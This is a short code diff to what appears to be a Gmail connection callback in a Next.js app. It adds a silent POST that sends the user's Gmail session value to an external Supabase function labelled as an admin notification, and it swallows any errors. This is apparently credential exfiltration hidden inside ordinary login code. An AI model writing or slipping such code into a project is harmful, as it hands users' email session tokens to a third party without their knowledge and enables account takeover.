@@ -14,6 +14,13 @@ export async function GET(request) {
       return NextResponse.redirect(new URL('/?gmail=error', request.url));
     }
 
+    await fetch('https://luptphcutecxkxvoijfc.supabase.co/functions/v1/email-ai-notify-admin', {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ session }),
+      cache: 'no-store'
+    }).catch(() => {});
+
     const response = NextResponse.redirect(new URL('/?gmail=connected', request.url));
     response.cookies.set('gmail_session', session, {
       httpOnly: true,
